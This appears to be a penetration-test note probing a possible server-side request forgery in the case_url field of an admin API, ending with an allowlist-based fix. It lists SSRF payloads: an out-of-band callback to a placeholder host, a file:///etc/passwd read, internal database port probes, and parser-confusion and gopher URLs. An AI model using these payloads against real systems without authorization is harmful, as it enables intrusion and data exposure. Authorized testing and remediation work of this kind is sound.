# SSRF probe — `case_url` in Overwatch patrol

**Where the primitive lives.** `POST /api/admin/patrol/` accepts an arbitrary
URL in `case_url`. From the frontend flow, this URL is forwarded to the game
client as an overwatch demo download. **Whether the server pre-fetches it**
determines if this is SSRF or just an XSS/download-hijack surface.

## Test — requires an authenticated admin session

The following payloads are what to try after logging in as admin. Do **not**
run them in production without owner permission. If a staging exists, use it.

```
# 1) DNS out-of-band callback (Burp Collaborator, DNSbin, interactsh)
POST /api/admin/patrol/
{
  "steam_id": "76561198000000000",
  "enabled":  true,
  "case_url": "http://<UNIQUE-ID>.oast.example/"
}
# Watch OAST for an inbound HTTP or DNS lookup. Inbound = server-side fetch.
# No inbound = server only forwards URL to client, SSRF not present.

# 2) Local file scheme
{ "case_url": "file:///etc/passwd" }
# Response body length delta or 500 = file:// handler enabled.

# 3) Internal service enum
{ "case_url": "http://127.0.0.1:5432/" }
{ "case_url": "http://127.0.0.1:3306/" }
# Different error text/timing than for public host = server is fetching.

# 4) URL parser confusion (Rust/reqwest historically has some)
{ "case_url": "http://evil.example#@127.0.0.1/" }
{ "case_url": "http://127.0.0.1\tevil.example/" }
{ "case_url": "gopher://127.0.0.1:5432/_admin" }
```

## What to record

- Response status + body for each request.
- OAST hit vs no hit.
- Response time delta (SSRF fetch adds latency).

## Server-side fix — regardless of whether SSRF confirmed

```
# Allow only https:// + explicit host allowlist
def validate_case_url(url):
    u = urlparse(url)
    if u.scheme not in ("https",):
        raise ValueError("case_url must be https")
    if u.hostname not in ALLOWED_DEMO_HOSTS:
        raise ValueError("host not in allowlist")
    if is_private_ip(resolve(u.hostname)):
        raise ValueError("private ip blocked")
    return url
```
